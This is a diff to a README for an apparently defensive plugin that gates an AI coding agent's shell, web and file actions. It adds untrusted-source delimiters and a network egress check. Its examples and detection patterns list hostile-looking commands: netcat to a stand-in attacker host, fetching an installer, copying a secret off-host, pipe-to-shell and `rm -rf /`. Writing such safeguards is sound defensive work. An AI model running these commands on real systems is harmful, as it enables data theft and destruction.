@@ -13,12 +13,15 @@ by default: when in doubt, deny.
 | Self-integrity | Refuses to register hooks if a `pin` mismatch is detected. |
 | Self-protection | `read`/`edit`/`write`/`apply_patch` over the plugin's own files → **deny**. |
 | Webfetch / Websearch | Only trusted domains pass without asking. Others → **ask**. |
+| Webfetch delimiters | Output from non-trusted sources is wrapped in `<untrusted-source url="...">...</untrusted-source>` so the agent treats it as data, not instructions. |
 | Shell — fast classifier | Pure-code patterns (no LLM). Catches obfuscation, pipe-to-shell, `rm -rf /`, `find -exec`, `tar --checkpoint-action=exec`, long base64 payloads. |
-| Shell — strong judge (optional) | LLM call for ambiguous cases. Can only **deny** or keep **ask**. Never **allow**. |
+| Shell — network egress | If a shell command uses `curl`, `wget`, `ssh`, `nc`, etc., the host is extracted and validated against `trustedDomains`. Non-trusted → **ask**. |
+| Shell — strong judge (optional) | LLM call for ambiguous cases. Can only **deny** or keep **ask**. Never **allow**. Rate-limited to 20 calls per session. |
 | Per-agent policy | In `build`/`plan`, the plugin **never** elevates `ask → allow`. Only the `auto` agent gets allowlist-driven auto-approval. |
-| Session limits | 3 denials / 250 actions / 30 min → session pauses. |
-| Audit | Hash-chained tamper-evident log of every decision. |
+| Session limits | 3 denials / 250 counted actions / 30 min → session pauses. Only risky actions (`bash`, `edit`, `write`, `apply_patch`, `webfetch`, `websearch`, `subagent`) count. |
+| Audit | Hash-chained tamper-evident log of every decision. Auto-rotates at 10,000 entries (keeps 5,000 most recent + archives older). |
 | TOCTOU | `tool.execute.before` hook re-checks file paths via `realpath` to detect symlink swap. |
+| `isSafeCached` | Module-level LRU+TTL cache (default 60s, 1000 entries) for `isSafe()` results — reduces CPU on repeated safe commands. |
 
 ## Install
 
@@ -154,6 +157,17 @@ Examples of commands that **always** ask in `auto` agent:
 - `terraform apply`, `kubectl delete`, `aws s3 rm`
 - `npm publish`, `cargo publish`
 - `ssh user@host`, `scp ./secret user@host:/tmp/`
+
+Examples of commands that **trigger the network egress check** (ask if host is not trusted):
+
+- `curl https://internal-api.mycompany.com/data` (whitelist `mycompany.com` if legitimate)
+- `wget https://unknown.example.com/installer`
+- `ssh user@bastion.prod.example`
+- `ssh -J user@jump user@dest`
+- `nc evil.example.com 4444`
+- `nslookup evil.example.com`
+
+The plugin extracts the host from URL or `user@host` syntax (including jump hosts in `-J`) and applies the same `trustedDomains` policy used for `webfetch`.
 
 ## What does NOT get blocked
 
